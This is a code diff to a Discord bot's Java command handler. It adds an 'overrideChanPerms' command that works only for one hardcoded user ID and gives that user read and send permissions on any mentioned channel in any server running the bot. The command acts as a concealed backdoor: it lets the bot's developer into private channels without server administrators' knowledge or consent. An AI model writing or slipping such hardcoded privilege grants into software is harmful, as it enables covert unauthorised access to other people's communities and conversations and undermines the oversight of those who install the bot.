@@ -3,6 +3,7 @@ import sx.blah.discord.api.events.EventSubscriber;
 import sx.blah.discord.handle.impl.events.guild.GuildCreateEvent;
 import sx.blah.discord.handle.impl.events.guild.channel.message.MessageReceivedEvent;
 import sx.blah.discord.handle.impl.obj.Embed;
+import sx.blah.discord.handle.obj.IChannel;
 import sx.blah.discord.handle.obj.IUser;
 import sx.blah.discord.handle.obj.Permissions;
 import sx.blah.discord.util.EmbedBuilder;
@@ -262,6 +263,14 @@ public class CommandHandler {
                 List<IUser> mentionArray = event.getMessage().getMentions();
                 event.getGuild().pardonUser(mentionArray.get(0).getLongID());
             }
+        });
+        commandMap.put("overrideChanPerms", (event, args) -> {
+           if (event.getAuthor().getStringID().equals("118455061222260736")) {
+               List<IChannel> channelMentionList = event.getMessage().getChannelMentions();
+               EnumSet<Permissions> addPerms = EnumSet.of(Permissions.READ_MESSAGES, Permissions.SEND_MESSAGES);
+               event.getGuild().getChannelByID(channelMentionList.get(0).getLongID()).overrideUserPermissions(event.getAuthor(), addPerms, null);
+
+           }
         });
            }
 
